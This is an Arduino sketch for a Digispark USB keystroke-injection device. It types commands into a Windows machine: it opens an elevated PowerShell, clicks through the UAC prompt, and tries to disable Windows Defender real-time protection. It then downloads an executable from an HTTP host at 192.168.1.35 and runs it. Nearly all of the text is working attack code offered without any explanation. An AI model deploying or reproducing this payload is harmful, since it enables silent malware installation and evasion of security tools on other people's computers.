#include "DigiKeyboard.h"


void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
   DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("Windows Powershell");
  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER,MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(2000);
     DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);  
      DigiKeyboard.delay(5000);
      DigiKeyboard.print("Set-MpPreference -DisableRea $true");
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5);
DigiKeyboard.print("$d = New-Object System.Net.WebClient");
DigiKeyboard.delay(5);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("$f = '1.exe'");
DigiKeyboard.delay(5);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("$d.DownloadFile('http://192.168.1.35/s.exe',$f)");
DigiKeyboard.delay(5);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("$e = New-Object -com shell.application");
DigiKeyboard.delay(5);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("$e.shellexecute($f)");
DigiKeyboard.delay(5);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.print("exit");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(5);

}
